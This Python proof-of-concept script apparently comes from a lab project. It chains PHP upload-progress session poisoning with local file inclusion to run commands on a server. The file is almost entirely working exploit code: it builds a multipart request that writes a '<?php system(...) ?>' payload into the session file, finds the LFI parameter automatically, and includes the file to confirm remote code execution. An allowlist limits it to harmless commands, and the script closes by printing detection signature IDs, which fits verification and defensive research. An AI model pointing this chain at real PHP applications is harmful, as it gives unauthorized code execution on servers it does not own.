#!/usr/bin/env python3
"""Verify the "PHP2Shell-branded" session-poisoning + LFI chain.

Wiz (2026-10-27) observed tools labelled PHP2Shell that do **not** touch
either CVE: they write PHP code into a session file through the
upload-progress feature, then include it through an application LFI. The
chain needs two application-level conditions and no memory corruption:

  1. session.upload_progress.enabled=On (the default);
  2. a reachable local file inclusion sink.

This POC writes the fixed allowlisted command into the progress value,
then includes `/tmp/sessions/sess_<sid>` through the lab's LFI. It is the
application-level complement to Chain A (which injects via the filename).

Usage:
  python3 poc/verify_session_poison_lfi.py --target http://127.0.0.1:18097
  python3 poc/verify_session_poison_lfi.py --target http://127.0.0.1:18097 \
      --param page --cmd id
"""

import argparse
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import lfi, probe
from php2shell.guard import ALLOWED_CMDS, check_cmd

MARKERS = {"id": rb"uid=\d+\(", "uname": rb"\bLinux\b", "whoami": rb"www-data"}


def poison(host, port, path, sid, cmd):
    payload = f'<?php system("{cmd}"); ?>'
    b = "SP"
    body = (
        f"--{b}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
        f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{payload}\r\n"
        f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{b}--\r\n"
    ).encode("latin-1")
    return probe.http_post(
        host, port, path, body,
        headers={"Content-Type": f"multipart/form-data; boundary={b}"},
        timeout=30, recv_timeout=20,
    ), payload


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18097")
    ap.add_argument("--path", default="/index.php", help="endpoint that starts the session")
    ap.add_argument("--lfi", default="/lfi.php", help="LFI sink path")
    ap.add_argument("--param", default=None,
                    help="LFI parameter (default: auto-discover)")
    ap.add_argument("--save-path", default="/tmp/sessions")
    ap.add_argument("--sid", default="php2shellpoison0123456789ab")
    ap.add_argument("--cmd", default="id", choices=ALLOWED_CMDS)
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")
    cmd = check_cmd(args.cmd)

    print("[*] Session-poisoning + LFI (Wiz 'branded' category)")
    print(f"    target: {host}:{port}  cmd: {cmd!r}  sid: {args.sid}")
    print()

    resp, payload = poison(host, port, args.path, args.sid, cmd)
    print(f"[1] poison: {probe.status(resp)}  payload={payload!r}")

    param = args.param
    if param is None:
        hits = lfi.discover(host, port, args.lfi)
        if hits:
            param = hits[0][0]
            print(f"[2] LFI discovery: ?{param}= (from {len(hits)} hit(s))")
        else:
            param = "page"
            print("[2] LFI discovery failed; falling back to ?page=")
    else:
        print(f"[2] LFI parameter forced: ?{param}=")

    sess = f"{args.save_path.rstrip('/')}/sess_{args.sid}"
    r = probe.http_get(host, port, f"{args.lfi}?{param}={sess}",
                       timeout=30, recv_timeout=20)
    body = probe.body(r)
    print(f"[3] include {sess}: {probe.status(r)}  body={len(body)} B")
    print()

    if re.search(MARKERS[cmd], body):
        print("[EVIDENCE] SESSION-POISONING + LFI RCE REPRODUCED")
        print("    - the upload-progress value was written into the session")
        print("      file verbatim, including the PHP code;")
        print(f"    - including the session file ran the fixed {cmd!r} command;")
        print("    - no memory corruption and no CVE precondition: this is")
        print("      the 'branded but unrelated' category Wiz flagged.")
        print("    - Detection: sid 210961807 (/tmp/sess_ in URI) and")
        print("      sid 210961808 (<?php in the progress field).")
        return 0
    print("[!] marker not found. The LFI may be absent, the session path")
    print("    may differ, or upload_progress may be disabled.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
